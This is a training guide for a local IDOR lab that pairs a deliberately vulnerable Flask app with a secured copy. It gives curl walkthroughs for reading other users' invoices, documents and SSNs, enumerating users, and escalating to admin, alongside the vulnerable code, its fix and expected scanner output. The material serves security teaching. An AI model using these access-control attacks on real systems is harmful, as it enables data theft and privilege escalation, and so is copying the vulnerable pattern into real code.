# IDOR Training Lab — Complete Training Guide

## Overview

This lab contains two identical-looking web applications (CorpPortal) built with
Python/Flask and SQLite. The **vulnerable version** (port 5001) contains 12 documented
IDOR (Insecure Direct Object Reference) vulnerabilities. The **secure version** (port 5002)
corrects all of them with proper object-level authorization.

**IDOR = Insecure Direct Object Reference** is listed as a sub-category of
OWASP A01:2021 — Broken Access Control, the #1 most critical web vulnerability class.

---

## Test Accounts

| Username | Password   | Role    | Dept            | Salary   |
|----------|------------|---------|-----------------|----------|
| alice    | alice123   | admin   | Executive       | $120,000 |
| diana    | diana123   | manager | Human Resources | $95,000  |
| bob      | bob123     | user    | Sales           | $65,000  |
| charlie  | charlie123 | user    | Engineering     | $85,000  |
| eve      | eve123     | user    | Finance         | $70,000  |

---

## Vulnerability Index

| ID           | Method | Endpoint                     | Impact                                            |
|--------------|--------|------------------------------|---------------------------------------------------|
| VULN-IDOR-001| GET    | /profile/<user_id>           | Exposes salary, SSN, home address                 |
| VULN-IDOR-002| GET    | /orders/<order_id>           | Reads any user's purchase history                 |
| VULN-IDOR-003| GET    | /invoices/<invoice_id>       | Exposes payment details (card numbers, bank refs) |
| VULN-IDOR-004| GET    | /documents/<doc_id>          | Reads confidential HR, financial, security docs   |
| VULN-IDOR-005| GET    | /tickets/<ticket_id>         | Reads private support tickets (passwords in-band) |
| VULN-IDOR-006| GET    | /api/users/<user_id>         | Full user record via API incl. salary + SSN       |
| VULN-IDOR-007| PUT    | /api/users/<user_id>         | Modify any user's profile, escalate privileges    |
| VULN-IDOR-008| GET    | /api/orders/<order_id>       | Read any order via API                            |
| VULN-IDOR-009| GET    | /api/invoices/<invoice_id>   | Read any invoice via API                          |
| VULN-IDOR-010| GET    | /api/documents/<doc_id>      | Read any document content via API                 |
| VULN-IDOR-011| GET    | /api/tickets/<ticket_id>     | Read any ticket via API                           |
| VULN-IDOR-012| GET    | /api/users?role=<role>       | Mass user enumeration by role                     |

---

## Module 1 — Understanding IDOR

### What is IDOR?

IDOR occurs when an application uses user-controllable identifiers (IDs) to access
internal objects (database records, files, accounts) without verifying the requesting
user is authorized to access that specific object.

### Classic Pattern

```
# Vulnerable: No check that order 42 belongs to the logged-in user
GET /orders/42

# Attacker changes 42 → 1, 2, 3 ... and reads all orders
GET /orders/1
GET /orders/2
```

### Why It's Dangerous

The application:
- Authenticates the user ✓ (knows who they are)
- Does NOT authorize the request ✗ (doesn't check *what* they may access)

This distinction — authentication vs. authorization — is the root cause.

---

## Module 2 — Step-by-Step Exploitation Walkthroughs

### Scenario A: Profile Information Disclosure (VULN-IDOR-001)

**Goal:** As Bob, read Alice's salary and SSN.

1. Log in as `bob / bob123` at http://127.0.0.1:5001/login
2. Visit your own profile at http://127.0.0.1:5001/profile (user_id = 2)
3. Note the URL structure: `/profile/2`
4. Change the URL to `/profile/1` (Alice's user ID)
5. **Result:** Alice's full profile loads — including SSN, salary ($120,000), and home address

**Expected vulnerable response:** Full profile page loads for Alice.
**Expected secure response (port 5002):** Redirect to dashboard with "Access denied" flash.

---

### Scenario B: Invoice + Payment Details (VULN-IDOR-003)

**Goal:** As Charlie, read Alice's payment card details.

```bash
# First — get your session cookie by logging in, then:
curl -s http://127.0.0.1:5001/api/invoices/1 \
  -H "Cookie: session=<your_session_cookie>"
```

**Expected vulnerable response:**
```json
{
  "id": 1,
  "user_id": 1,
  "invoice_number": "INV-2024-0001",
  "amount": 4500.0,
  "payment_details": "AMEX Corporate Card ending 4821 | Auth: TXN-8834521",
  ...
}
```

**Expected secure response:**
```json
{"error": "Access denied"}
```
HTTP 403 Forbidden

---

### Scenario C: Confidential Document Read (VULN-IDOR-004)

**Goal:** As Bob (sales), read the org chart with all employees' salaries and SSNs.

```bash
# UI attack
# Log in as bob, then visit:
http://127.0.0.1:5001/documents/3

# API attack
curl -s http://127.0.0.1:5001/api/documents/3 \
  -H "Cookie: session=<bob_session>"
```

**Document 3** is Alice's `org_chart_2024.txt` — marked CONFIDENTIAL — containing
full salary data and SSNs for all 5 employees.

---

### Scenario D: Privilege Escalation via Write IDOR (VULN-IDOR-007)

**Goal:** As Bob, promote yourself to admin by modifying user_id 2.

```bash
curl -s -X PUT http://127.0.0.1:5001/api/users/2 \
  -H "Content-Type: application/json" \
  -H "Cookie: session=<bob_session>" \
  -d '{"role": "admin"}'
```

**Expected vulnerable response:**
```json
{
  "message": "User updated",
  "user": {"id": 2, "username": "bob", "role": "admin", ...}
}
```

**Expected secure response:**
- If Bob tries to update his own record: only `full_name`, `phone`, `address` are updatable (not `role`)
- If Bob tries to update another user: HTTP 403

---

### Scenario E: HR Ticket Exposure (VULN-IDOR-005)

**Goal:** Read a confidential HR termination ticket.

```
http://127.0.0.1:5001/tickets/7
```

Ticket #7 is Diana's CRITICAL priority "Employee termination — immediate action required"
ticket — containing instructions for IT to immediately revoke access. Completely internal.

---

### Scenario F: Mass User Enumeration (VULN-IDOR-012)

**Goal:** List all admin accounts.

```bash
curl -s "http://127.0.0.1:5001/api/users?role=admin" \
  -H "Cookie: session=<any_session>"

# Or get all users:
curl -s "http://127.0.0.1:5001/api/users" \
  -H "Cookie: session=<any_session>"
```

Returns full user records for every user including salary and SSN.

---

## Module 3 — Comparing Vulnerable vs. Secure

Run the same request against both ports:

```bash
# Log in to both apps and capture both session cookies

# Vulnerable — returns Alice's invoice (as Bob)
curl -s http://127.0.0.1:5001/api/invoices/1 -H "Cookie: session=<BOB_VULN_COOKIE>"
# → 200 OK with full invoice including payment_details

# Secure — denied (as Bob)
curl -s http://127.0.0.1:5002/api/invoices/1 -H "Cookie: session=<BOB_SEC_COOKIE>"
# → 403 {"error": "Access denied"}
```

---

## Module 4 — Root Cause Analysis

### The Vulnerable Code Pattern

```python
# VULNERABLE — vulnerable_app/app.py
@app.route('/api/invoices/<int:invoice_id>')
@login_required
def api_get_invoice(invoice_id):
    db = get_db()
    # BAD: Fetches the invoice directly using the URL parameter.
    # Any authenticated user who knows (or guesses) invoice_id=1 gets Alice's invoice.
    invoice = db.execute('SELECT * FROM invoices WHERE id = ?', [invoice_id]).fetchone()
    if not invoice:
        return jsonify({'error': 'Invoice not found'}), 404
    return jsonify(dict(invoice))  # No ownership check!
```

### The Secure Fix

```python
# SECURE — secure_app/app.py
@app.route('/api/invoices/<int:invoice_id>')
@login_required
def api_get_invoice(invoice_id):
    db = get_db()
    invoice = db.execute('SELECT * FROM invoices WHERE id = ?', [invoice_id]).fetchone()

    if not invoice:
        return jsonify({'error': 'Invoice not found'}), 404

    # SECURE: Verify the requesting user owns this invoice, OR is an admin
    if not check_ownership(invoice['user_id']):
        log_audit(session['user_id'], session['username'], 'READ',
                  'invoice', invoice_id, 'denied')
        return jsonify({'error': 'Access denied'}), 403

    log_audit(session['user_id'], session['username'], 'READ',
              'invoice', invoice_id, 'success')
    return jsonify(dict(invoice))
```

### The `check_ownership()` Function

```python
def check_ownership(resource_user_id):
    """
    Returns True if the current session user owns the resource OR is admin.
    This single function enforces authorization across all endpoints.
    """
    current_uid  = session.get('user_id')
    current_role = session.get('role')

    if not current_uid:
        return False

    if current_role == 'admin':    # Admins bypass ownership check
        return True

    return resource_user_id == current_uid  # Owner match
```

---

## Module 5 — Secure Coding Principles Applied

### 1. Object-Level Authorization

Every endpoint that returns a specific resource must verify:
```
resource.owner_id == current_user.id  OR  current_user.role == 'admin'
```

### 2. Consistent Error Responses

```python
# BAD — reveals whether resource exists
if not owned: return 403 "That invoice belongs to someone else"

# GOOD — same response whether missing or unauthorized
if not invoice or not owned: return 404 "Invoice not found"
```
(Note: the lab shows the owner explicitly for *training clarity* — in production,
always return 404 for both cases.)

### 3. Field-Level Access Control

```python
# Non-admins cannot update their own role:
if session.get('role') == 'admin':
    allowed_fields = ['full_name', 'email', 'phone', 'address', 'role', 'department']
else:
    allowed_fields = ['full_name', 'phone', 'address']  # role locked
```

### 4. Strip Sensitive Fields from API Responses

```python
data = dict(user)
data.pop('password', None)          # Never return passwords
if session.get('role') != 'admin':
    data.pop('salary', None)        # Salary: admin-only
    data.pop('ssn', None)           # SSN: admin-only
return jsonify(data)
```

### 5. Audit Logging

The secure app logs every resource access — success or denied — to `audit_logs`.
Log in as alice and visit http://127.0.0.1:5002/admin/audit to see it.

---

## Module 6 — Expected Scanner Results

### Against Vulnerable App (port 5001)

A correctly implemented IDOR scanner should detect:

```
[CRITICAL] VULN-IDOR-001  GET /profile/1
  Logged in as: bob (user_id=2)
  Accessed resource owned by: alice (user_id=1)
  Evidence: Response contains alice@corpportal.local, salary: $120,000.00
  HTTP Status: 200 OK

[CRITICAL] VULN-IDOR-003  GET /api/invoices/1
  Logged in as: bob (user_id=2)
  Accessed resource owned by: alice (user_id=1)
  Evidence: invoice_number=INV-2024-0001, payment_details=AMEX...4821
  HTTP Status: 200 OK

[CRITICAL] VULN-IDOR-004  GET /api/documents/3
  Evidence: org_chart_2024.txt content includes SSN data for all employees
  HTTP Status: 200 OK

[CRITICAL] VULN-IDOR-007  PUT /api/users/2 {"role":"admin"}
  Evidence: Response shows role changed to "admin"
  HTTP Status: 200 OK

[HIGH] VULN-IDOR-012  GET /api/users
  Evidence: Returns all 5 users with salary and SSN
  HTTP Status: 200 OK
```

### Against Secure App (port 5002)

```
[INFO] GET /api/invoices/1
  HTTP Status: 403 Forbidden
  Response: {"error":"Access denied"}
  Result: ✓ Access correctly denied — no IDOR finding

[INFO] GET /api/documents/3
  HTTP Status: 403 Forbidden
  Result: ✓ Access correctly denied

[INFO] PUT /api/users/2 {"role":"admin"}
  HTTP Status: 403 Forbidden
  Result: ✓ Privilege escalation blocked

Total IDOR findings: 0
```

---

## Module 7 — OWASP References

- OWASP A01:2021 — Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- OWASP Testing Guide v4.2 — IDOR (OTG-AUTHZ-004)
- CWE-639: Authorization Bypass Through User-Controlled Key
- CWE-284: Improper Access Control

---

## Quick Reference Card

```
┌──────────────────────────────────────────────────────────────────────────┐
│  IDOR Quick Test Checklist                                               │
├──────────────────────────────────────────────────────────────────────────┤
│ 1. Authenticate as User A, note all resource IDs in responses            │
│ 2. Log in as User B                                                      │
│ 3. For each resource ID from step 1, attempt direct access               │
│ 4. Check: Did the app return 200 instead of 403/404?                     │
│ 5. Check: Does the response contain User A's data?                       │
│ 6. Test POST/PUT/DELETE with IDs belonging to other users                │
│ 7. Test sequential ID enumeration (1, 2, 3, ...)                         │
│ 8. Test the API separately from the UI — they may differ                 │
└──────────────────────────────────────────────────────────────────────────┘
```
